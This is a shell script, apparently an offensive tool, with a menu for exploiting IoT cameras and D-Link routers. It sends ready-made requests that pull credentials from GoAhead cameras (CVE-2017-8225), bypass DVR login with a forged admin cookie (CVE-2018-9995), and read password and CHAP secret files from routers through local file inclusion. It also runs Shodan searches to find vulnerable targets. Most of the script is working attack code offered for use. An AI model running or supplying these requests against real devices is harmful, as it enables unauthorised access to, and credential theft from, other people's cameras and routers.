#!/bin/sh
echo "=============================="
echo "=        Exploit IoT         ="
echo "=       camera & router      ="
echo "=   Code by Shaco JX & MTA   ="
echo "=============================="

#this is script exploit IoT (camera & router)
#Code by Shaco JX & MTA team

#    ____  _                           ___  __
#   / ___|| |__   __ _  ___ ___       | \ \/ /
#   \___ \| '_ \ / _` |/ __/ _ \   _  | |\  / 
#    ___) | | | | (_| | (_| (_) | | |_| |/  \ 
#   |____/|_| |_|\__,_|\___\___/   \___//_/\_\
                                          

echo "Do you want to install tool & update?"
echo "If you haven't w3m browser then please choice yes!"
echo -n "[Y]es / [N]o : "
read ins
case $ins in
    Y)
        echo "Installing....."
        apt-get update
        apt-get install w3m
        break
        ;;
    y)
        echo "Installing....."
        apt-get update
        apt-get install w3m
        break
        ;;
    *)
        break
        ;;
esac

echo "Do you want to exploit camera or router?"
echo "[1] Camera"
echo "[2] Router"
echo "[3] Search IoT on shodan.io"
echo -n "Your choice:"
read choice

case $choice in
    1)
        echo -n "Enter ip camera: "
        read ip
        echo -n "Enter port: "
        read port
        echo "Choice CVE to exploit"
        echo "[1] CVE-2017-8225 GoAhead"
        echo "[2] CVE-2018-9995 DVR NVR XVR"
        echo -n "Enter your choice: "
        read cve
        case $cve in
            1)
                echo "Exploiting"
                echo -n "Enter path save file system.ini (EX: /home/admin/Desktop): "
                read path
                echo "--------------->"
                rm -rf $path/camerahack.txt
                curl http://$ip:$port/system.ini\?loginuse\&loginpas --output $path/camerahack.txt
                cat /$path/camerahack.txt
		        echo "\n"
                echo "Exploit success"
                break
                ;;
            2)
                echo "Exploiting"
                echo "--------------->"  
                curl "http://$ip:$port/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
                echo "\n-------------->"
                echo "Exploit success"
                break
                ;;
            *)
                echo "Invalid! please enter again!"
                break
                ;;
	    esac
	    break
	    ;;
    2)
        echo -n "Enter ip router: "
        read iprouter
        echo -n "Enter port: "
        read portrouter
        echo "Do you want to exploit router Mathopd/1.5p6 d-link dir version?"
        echo "[1] version <= 615"
        echo "[2] version > 615"
        echo -n "Enter version D-Link dir: "
        read version
        case $version in
            1)
                echo "Exploiting"
                echo "---------------->"
                w3m http://$iprouter:$portrouter/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd
                break
                ;;
            2)
                cho "Exploiting"
                echo "---------------->"
                w3m http://$iprouter:$portrouter/model/__show_info.php?REQUIRE_FILE=/etc/ppp/chap-secrets
                break
                ;;
            *)
                echo "Invalid! please enter again!"
                break
                ;;
        esac
        break
        ;;
    3)
        echo "[1] Search camera CVE-2017-8225 GoAhead"
        echo "[2] Search camera CVE-2018-9995 DVR XVR NVR"
        echo "[3] Search router D-link dir Mathopd/1.5p6 LFI"
        echo -n "Enter your choice: "
        read search
        case $search in
            1)
                echo "Search camera CVE-2017-8225 GoAhead"
                w3m https://www.shodan.io/search?query=GoAhead+5ccc069c403ebaf9f0171e9517f40e41
                break
                ;;
            2)
                echo "Search camera CVE-2018-9995 DVR XVR NVR"
                w3m https://www.shodan.io/search?query=html%22%2Flogin.rsp%22
                break
                ;;
            3)
                echo "Search router D-link dir Mathopd/1.5p6 LFI"
                w3m https://www.shodan.io/search?query=Mathopd%2F1.5p6
                break
                ;;
            *)
                echo "Invalid! please enter again!"
                break
                ;;
        esac
        break
        ;;
    *)
        echo "Invalid! please enter again!"
        break
        ;;
esac


